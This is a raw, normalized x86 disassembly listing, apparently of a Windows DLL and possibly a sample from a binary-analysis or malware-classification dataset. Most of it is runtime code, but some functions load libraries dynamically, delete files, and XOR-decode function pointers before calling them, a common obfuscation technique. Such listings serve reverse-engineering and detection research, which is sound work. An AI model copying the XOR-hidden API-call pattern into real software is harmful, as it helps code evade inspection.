lea ecx [ ebp + 0x24 ]
call sub_1000bddb
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x90 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_1002c59e
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1002c301
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor edi edi
test bl bl
jne r-xdata
sub eax edx
mov edi eax
jmp r-xdata
xor edi edi
cmp edi esi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc [ ebp - 0x94 ]
cmp [ ebp - 0x94 ] 0x4
jb r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1002c301
add esp 0x14
xor edi edi
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0xa8 ] eax
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x94 ]
movsx eax [ ebp + eax - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x98 ]
push edi
push [ ebp - 0x90 ]
xor esi esi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] esi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] esi
push [ ebp - 0xa4 ]
call sub_1002c301
add esp 0x14
push esi
push ebx
lea ecx [ ebp - 0x64 ]
call sub_10041a20
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10041a20
push esi
push ebx
lea ecx [ ebp + 0x24 ]
call sub_10041a20
mov eax [ ebp - 0xa4 ]
call sub_1004fa89
retn 0x38
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x8c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
inc eax
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0xc ]
push eax
call sub_10033ebe
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0xa8 ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_1002c59e
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0x88 ] al
push [ ebp - 0x88 ]
lea ecx [ ebp + 0xc ]
call sub_1002c59e
mov eax [ ebp - 0x8c ]
sub eax [ ebp + 0x34 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_1002c301
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x10
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xf4 ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx [ ebp - 0x8c ]
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0xc ]
push eax
call sub_10033ebe
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ esi ]
add esp 0x14
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
lea ecx [ ebp + 0xc ]
call sub_1002c59e
cmp [ ebp + 0x38 ] 0x10
mov ecx [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x34 ]
sub eax [ ebp - 0x8c ]
push [ ebp - 0x8c ]
add eax ecx
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
push eax
call sub_10033ebe
add esp 0x14
jmp r-xdata
sub_100143a0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0x94
cmp [ esi + 0x14 ] 0x8
mov ebx eax
jb r-xdata
push edi
xor edi edi
mov edx 0x418f
sub esi ebx
mov esi [ esi ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
test edi edi
mov [ eax ] dx
pop edi
js r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x28 ]
cmp eax 0x13
je r-xdata
lea ecx [ edx + 0x7fffbe6f ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax 0x418f
mov ecx ebx
cmp eax 0x14
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jbe r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
js r-xdata
cmp [ ecx ] dx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax 0x418f
mov ecx ebx
cmp [ esi + 0x84 ] 0x8
jb r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
lea edx [ esi + 0x70 ]
mov edx [ esi + 0x70 ]
jmp r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
mov eax 0x418f
mov ecx ebx
mov edi edi
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
push edx
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
push eax
mov esi 0x418f
call sub_1003d910
mov eax [ eax ]
sub_10014520
push ebp
mov ebp esp
push 0xffffffff
push sub_10081b76
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx esi
call [ r--data ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] 0x0
mov [ esi + 0x94 ] cx
call sub_10023cd0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x94 ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
mov eax [ eax ]
sub_100145d0
mov eax ecx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
retn
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] edx
mov ecx [ eax ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
retn
jmp r-xdata
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov ecx edx
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
sub_10014620
push ebp
mov ebp esp
sub esp 0x15c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xa4 ]
push ebx
push edi
lea ebx [ esi + 0x94 ]
push r--data
xor edi edi
mov ecx ebx
call sub_10039b60
test eax eax
je r-xdata
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov [ esi + 0x90 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x58 ]
mov eax 0x3
call sub_10013830
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
mov eax [ esi + 0x90 ]
push eax
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x15c ]
push eax
push 0xffffffff
push ebx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x90 ]
lea ecx [ ebp - 0x15c ]
push ecx
push edx
jmp r-xdata
mov ebx [ ebx ]
lea edx [ ebp - 0x54 ]
mov eax 0x72
call sub_10013830
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28 ]
mov eax 0x121
call sub_10013830
lea edx [ ebp - 0x44 ]
mov eax 0xc3
call sub_10013830
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
push eax
call edi
mov ecx [ ebp - 0x4 ]
pop edi
mov [ esi + 0x50 ] eax
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ eax ]
sub_1001476d
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_10010183
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100612be
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_100147ca
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100147f0
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xa
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_100148c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080818
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10061090
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x1c
call sub_100050e0
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100149fd
push 0x60
mov eax sub_1007f4be
call sub_1001bb6b
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
mov [ ebp - 0x68 ] ebx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005434f
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x64 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
push [ ebp - 0x60 ]
xor edi edi
inc edi
mov ecx esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x51 ] 0x0
call sub_1003b7cf
test al al
jne r-xdata
push edi
push ecx
push [ ebp - 0x60 ]
push esi
push ebx
push [ ebp + 0x8 ]
call sub_100249e1
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_1004fa89
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10004056
push [ ebp - 0x60 ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x60 ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] cl
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10004056
inc ebx
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_10066573
cmp [ ebp - 0x58 ] 0x0
mov edi [ ebp - 0x60 ]
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x38 ] ecx
jne r-xdata
mov [ ebx ] 0x2d
push edi
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x52 ] al
mov [ ebp - 0x52 ] cl
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ebx [ ebp - 0x58 ]
push edi
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
call sub_100680bc
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_10066573
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor ebx ebx
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10006560
push [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push edi
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_10041a20
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
cmp [ esi + 0x5 ] 0x65
je r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
push [ ebp - 0x60 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_10066573
push edi
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx 0x24
jge r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
push edi
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x45
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
push edi
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_10004056
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push edi
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_10004056
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x52 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc ebx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
push edi
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10004056
inc [ ebp - 0x50 ]
mov ecx esi
call sub_10066573
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_10004056
mov ecx esi
call sub_10066573
push [ ebp - 0x60 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_10004056
sub_10014fb0
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x210 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
call sub_10030590
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10007650
lea edx [ ebp - 0x210 ]
add esp 0x4
push edx
call sub_10041ef0
lea eax [ ebp - 0x210 ]
add esp 0x4
push eax
call sub_10010740
lea ecx [ ebp - 0x210 ]
